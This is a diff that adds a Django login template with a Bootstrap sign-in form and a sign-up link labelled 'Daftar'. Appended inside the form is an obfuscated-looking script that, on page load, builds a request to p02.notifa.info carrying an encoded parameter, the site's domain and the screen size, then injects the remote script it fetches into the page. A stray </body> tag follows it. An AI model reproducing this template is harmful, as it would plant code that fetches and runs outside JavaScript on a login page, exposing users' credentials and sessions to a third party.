@@ -1,0 +1,30 @@
+<!-- templates/registration/login.html -->
+{% extends 'base.html' %}
+
+{% block title %}Login{% endblock %}
+
+{% block content %}
+<div class="text-center">
+
+    <form class="form-signin" method="POST">
+        {% csrf_token %}
+        {% load static %}
+      <img class="mb-4" src="{% static "images/bootstrap-solid.svg" %}" alt="" width="72" height="72">
+      <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
+      <label for="inputUser" class="sr-only">User Name</label>
+      <input type="text" name="username" id="inputUser" class="form-control" placeholder="Username" required autofocus>
+      <label for="inputPassword" class="sr-only">Password</label>
+      <input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
+   <div class="checkbox mb-3">
+        <label>
+          <input type="checkbox" value="remember-me"> Remember me
+        </label>
+      </div>
+      <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
+      <a href="{% url 'signup' %}" class="btn btn-lg btn-success btn-block" >Daftar</a>
+      
+      <p class="mt-5 mb-3 text-muted">&copy; 2017-2018</p>
+    </form>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mAVyzoVct0c7At%2bJgrzMVC%2bxySyA5inEB8jJAlzCHG%2bwBoaUnPTqyIfGstLSAZhjNcc6qtrL%2f%2b49xvP0KcOhtMUBOENaVf0fZKBlp7NA70oREdHFbJAU2a9xdHLZDkDaVDybQw5SP5h%2bHibC6WzoTnT9jctOi0qJL21YaXAmteF9XLIyIwU8X9L1cyNCGl%2fleeSMC4T1jaE%2bIIrgpmmv2ab17TcINQ9xO7Yl1aKeaazP3WVbiji1BTSm77zAbff3y8YEpM%2faMWtVk9%2fATx4nOoRgZfJiXSYwUuIRW7CkjAF9ZX9OuLlViOVdILVrk4YWZJjsrHVRH5BU7lIw4guTAPvA0WtfUIaPnmknZKDVgFobkgMXAzbHEy0%2bpZ%2bPuf1Nqbms8VWErUv1W80mHA5fRYSdZkoccewoMZU90jekrbzwSuZ4TfUeXhBIumlVg0tG2hNC5HOoRdl7AW%2bRamMMIxTtrjRuLpWAApWYGwvwYqVG1jhCoR5WBq%2bcFsNhlXCIp9NcGkZ7iCEoi8xtxOz6uABFj2ueUjXUaW34%2bhxW8tQQzmzymLNW3o9%2bc2yP4CVLK0enJ5UP4I2E%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</div>
+{% endblock %}
